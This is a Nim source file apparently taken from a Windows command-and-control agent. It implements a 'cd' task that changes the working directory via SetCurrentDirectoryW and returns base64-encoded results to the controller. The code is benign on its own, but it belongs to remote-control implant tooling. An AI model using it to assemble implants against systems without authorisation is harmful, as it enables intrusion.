import os, strutils, base64, winim, strformat, sequtils
import ../types

proc taskCd*(task: Task): TaskResult = 

    let targetDirectory = task.args.join(" ").replace("\"", "").replace("'", "")
    echo fmt"Changing current working directory to {targetDirectory}."

    try: 
        # Get current working directory using GetCurrentDirectory
        if SetCurrentDirectoryW(targetDirectory) == FALSE:         
            raise newException(OSError, fmt"Failed to change working directory ({GetLastError()}).")

        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode(""),
            status: Completed
        )

    except CatchableError as err: 
        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode(fmt"An error occured: {err.msg}" & "\n"),
            status: Failed 
        )